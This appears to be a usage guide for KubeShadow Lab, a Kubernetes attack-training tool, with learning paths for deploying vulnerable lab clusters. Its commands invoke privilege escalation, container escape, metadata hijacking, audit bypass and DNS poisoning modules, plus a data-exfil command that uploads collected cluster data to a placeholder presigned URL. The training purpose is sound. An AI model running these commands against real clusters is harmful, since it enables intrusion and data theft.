# KubeShadow Lab Usage Examples

This document provides comprehensive examples of using the KubeShadow Lab module for different scenarios and environments.

## 🚀 Quick Start Examples

### 1. Local Development with Minikube
```bash
# Deploy lab to minikube
./kubeshadow lab --provider minikube

# Start dashboard
./kubeshadow dashboard

# Run reconnaissance with dashboard
./kubeshadow recon --dashboard

# Clean up when done
./kubeshadow lab cleanup --provider minikube
```

### 2. Cloud Provider Deployment (AWS)
```bash
# Authenticate with AWS (run first)
aws configure
# or
aws sso login

# Deploy lab to AWS EKS
./kubeshadow lab --provider aws --region us-west-2 --cluster-name my-lab

# Start dashboard
./kubeshadow dashboard

# Run security tests
./kubeshadow recon --dashboard
./kubeshadow rbac-escalate --dashboard

# Clean up entire cluster
./kubeshadow lab cleanup --provider aws --cluster-name my-lab --confirm
```

### 3. Google Cloud Platform (GCP)
```bash
# Authenticate with GCP
gcloud auth login
gcloud auth application-default login

# Deploy lab to GCP GKE
./kubeshadow lab --provider gcp --region us-central1

# Run tests with dashboard
./kubeshadow recon --dashboard
./kubeshadow data-exfil --presigned-url "YOUR_GCS_URL" --export-recon --dashboard
```

### 4. Azure Kubernetes Service
```bash
# Authenticate with Azure
az login

# Deploy lab to Azure AKS
./kubeshadow lab --provider azure --region eastus

# Test security configurations
./kubeshadow recon --dashboard
./kubeshadow sidecar-inject --dashboard
```

## 🎓 Educational Scenarios

### Scenario 1: Complete Security Assessment
```bash
# 1. Deploy lab environment
./kubeshadow lab --provider minikube

# 2. Start monitoring dashboard
./kubeshadow dashboard

# 3. Perform reconnaissance
./kubeshadow recon --dashboard

# 4. Test RBAC configurations
./kubeshadow rbac-escalate --dashboard

# 5. Attempt container escape
./kubeshadow sidecar-inject --dashboard

# 6. Test data exfiltration
./kubeshadow data-exfil --presigned-url "YOUR_URL" --export-recon --dashboard

# 7. Clean up
./kubeshadow lab cleanup
```

### Scenario 2: Cloud Security Testing
```bash
# 1. Deploy to cloud provider
./kubeshadow lab --provider aws --region us-west-2

# 2. Test cloud-specific vulnerabilities
./kubeshadow recon --dashboard
./kubeshadow metadata-hijack --dashboard
./kubeshadow assume-role-abuse --dashboard

# 3. Export findings
./kubeshadow data-exfil --presigned-url "YOUR_S3_URL" --export-recon --dashboard

# 4. Clean up
./kubeshadow lab cleanup --provider aws --confirm
```

### Scenario 3: Multi-Environment Testing
```bash
# Test on multiple environments
./kubeshadow lab --provider minikube
./kubeshadow recon --dashboard
./kubeshadow lab cleanup

./kubeshadow lab --provider kind
./kubeshadow recon --dashboard
./kubeshadow lab cleanup --provider kind
```

## 🔧 Advanced Usage

### Custom Cluster Names
```bash
# Deploy with custom cluster name
./kubeshadow lab --provider aws --cluster-name security-lab-2024

# Clean up specific cluster
./kubeshadow lab cleanup --provider aws --cluster-name security-lab-2024
```

### Skip Authentication
```bash
# Use existing cloud credentials
./kubeshadow lab --provider aws --skip-auth
```

### Dashboard Integration
```bash
# All commands support dashboard integration
./kubeshadow lab --dashboard
./kubeshadow recon --dashboard
./kubeshadow rbac-escalate --dashboard
./kubeshadow data-exfil --presigned-url "URL" --dashboard
```

## 🛠️ Troubleshooting Examples

### Check Lab Status
```bash
# Verify lab deployment
kubectl get pods -n kubeshadow-lab
kubectl get services -n kubeshadow-lab
kubectl get secrets -n kubeshadow-lab
```

### Debug Cloud Authentication
```bash
# AWS
aws sts get-caller-identity

# GCP
gcloud auth list

# Azure
az account show
```

### Monitor Dashboard
```bash
# Start dashboard on custom port
./kubeshadow dashboard --port 8081

# Access dashboard
curl http://localhost:8081
```

## 📊 Dashboard Workflow

### Complete Security Testing Workflow
```bash
# 1. Deploy lab
./kubeshadow lab --provider minikube --dashboard

# 2. Open dashboard in browser
# Navigate to http://localhost:8080

# 3. Run reconnaissance
./kubeshadow recon --dashboard

# 4. Test RBAC
./kubeshadow rbac-escalate --dashboard

# 5. Test container security
./kubeshadow sidecar-inject --dashboard

# 6. Test network security
./kubeshadow kubelet-jack --dashboard

# 7. Export data
./kubeshadow data-exfil --presigned-url "URL" --export-recon --dashboard

# 8. Clean up
./kubeshadow lab cleanup --dashboard
```

## 🎯 Learning Paths

### Beginner Path
```bash
# 1. Start with local environment
./kubeshadow lab --provider minikube

# 2. Learn basic reconnaissance
./kubeshadow recon --dashboard

# 3. Understand RBAC
./kubeshadow rbac-escalate --dashboard

# 4. Clean up
./kubeshadow lab cleanup
```

### Intermediate Path
```bash
# 1. Deploy to cloud
./kubeshadow lab --provider aws

# 2. Advanced reconnaissance
./kubeshadow recon --dashboard

# 3. Container escape techniques
./kubeshadow sidecar-inject --dashboard

# 4. Data exfiltration
./kubeshadow data-exfil --presigned-url "URL" --dashboard

# 5. Clean up
./kubeshadow lab cleanup --provider aws
```

### Advanced Path
```bash
# 1. Multi-cloud deployment
./kubeshadow lab --provider aws
./kubeshadow recon --dashboard
./kubeshadow lab cleanup

./kubeshadow lab --provider gcp
./kubeshadow recon --dashboard
./kubeshadow lab cleanup

# 2. Advanced exploitation
./kubeshadow rbac-escalate --dashboard
./kubeshadow sidecar-inject --dashboard
./kubeshadow kubelet-jack --dashboard

# 3. Stealth techniques
./kubeshadow audit-bypass --dashboard
./kubeshadow dns-cache-poison --dashboard
```

## 🔍 Monitoring and Analysis

### Real-time Monitoring
```bash
# Start dashboard
./kubeshadow dashboard

# Run commands with monitoring
./kubeshadow recon --dashboard
./kubeshadow rbac-escalate --dashboard

# Export results
# Use dashboard export buttons for CSV/PDF
```

### Data Collection
```bash
# Collect comprehensive data
./kubeshadow data-exfil --presigned-url "YOUR_URL" --export-recon --dashboard

# Add custom files
./kubeshadow data-exfil --presigned-url "YOUR_URL" --add-file "custom-data.txt" --dashboard
```

## 🧹 Cleanup Strategies

### Gradual Cleanup
```bash
# Remove specific resources
kubectl delete namespace kubeshadow-lab
kubectl delete namespace kubeshadow-secrets
```

### Complete Cleanup
```bash
# Remove all lab resources
./kubeshadow lab cleanup

# Remove entire cluster (cloud)
./kubeshadow lab cleanup --provider aws --confirm
```

### Emergency Cleanup
```bash
# Force cleanup without confirmation
./kubeshadow lab cleanup --confirm
```

## 📚 Best Practices

### For Students
1. **Start local** - Use minikube for initial learning
2. **Document findings** - Use dashboard export features
3. **Practice regularly** - Run through scenarios multiple times
4. **Understand impact** - Learn business implications of vulnerabilities

### For Instructors
1. **Monitor progress** - Use dashboard to track student activity
2. **Provide guidance** - Guide students through complex scenarios
3. **Encourage documentation** - Have students document their findings
4. **Emphasize ethics** - Teach responsible disclosure practices

### For Organizations
1. **Isolate environments** - Keep lab environments separate from production
2. **Monitor costs** - Track cloud resource usage
3. **Secure access** - Limit lab environment access
4. **Regular cleanup** - Ensure environments are cleaned up after use

---

**Happy Learning! 🚀**

The KubeShadow Lab module provides endless possibilities for Kubernetes security learning. Experiment, explore, and always practice responsibly!
